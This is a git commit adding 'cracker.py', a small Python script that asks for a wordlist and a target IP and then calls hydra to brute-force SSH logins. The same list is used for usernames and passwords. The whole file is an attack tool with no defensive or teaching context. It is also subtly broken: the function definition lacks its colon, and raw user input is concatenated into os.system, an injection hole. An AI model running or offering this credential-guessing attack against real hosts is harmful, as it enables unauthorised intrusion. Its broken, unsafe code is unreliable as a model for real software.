6fde450f1ae386092b62b657e440b091a45fae49
lodex23 <81414802+lodex23@users.noreply.github.com>
2021-11-10 15:51:37 +0100

    Add files via upload

---
+++ cracker.py
@@ -0,0 +1,27 @@
+import os
+
+
+def ssh(wrdList, Host)
+      os.system('hydra -L ' + wrdList + ' -P ' + wrdList + ' ' + Host + ' ssh')
+
+
+
+
+path = input("Enter the path of the Wordlist: ")
+print("------------------------------------------")
+print("Path set to: " + path)
+print("------------------------------------------")
+input("Press enter to continue")
+
+os.system('clear')
+
+ip = input("Enter Target ip: ")
+print("------------------------------------------")
+print("Set ip to: " + ip)
+print("------------------------------------------")
+input("Press enter to start attack")
+
+os.system('clear')
+
+
+ssh(path, ip)
